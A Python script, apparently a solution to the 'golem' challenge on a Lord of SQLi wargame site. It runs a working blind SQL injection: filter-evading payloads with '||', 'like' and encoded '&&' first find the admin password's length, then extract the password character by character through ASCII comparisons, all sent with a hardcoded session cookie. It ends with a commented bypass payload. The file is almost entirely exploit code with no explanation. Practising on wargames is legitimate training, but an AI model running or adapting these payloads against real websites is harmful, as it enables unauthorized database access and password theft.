from hashlib import new
from requests import get

import string


sym = "~!@#$%^&*()_+|}{\][';/?><,.:"
url = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
cookie  = dict(PHPSESSID="lpaiqju1pvd389508vh94qhl4s")
letters = string.digits + string.ascii_letters + sym 
password = ""
length = 1


# get password length
while True:
    param = "?pw=' || id like 'admin' %26%26 length(pw) like '"+str(length)

    new_url = url+param
    req = get(new_url, cookies=cookie)
    print("[length] " + str(length))
    if(req.text.find("Hello admin") > 0):
        print("Found password lenght= " + str(length))
        break
    length +=1

for i in range(1, length+1):
    print("[idx]: " + str(i))
    for x in range (256):
        x = (x + 32) % 256
        param = "?pw=' || id like 'admin' %26%26 ascii(mid(pw,"+ str(i) +",1)) like "  + str(x) + "-- -"
        print(param)
        new_url = url+param

        req = get(new_url, cookies=cookie)
        if(req.text.find("Hello admin") > 0):
            print("[Found] password char " + str(i) + " = " + str(x))
            password += chr(x)
            break

print("Password: " + password)

"""

' || id like 'admin' %26%26 'admin' like 'adm%

"""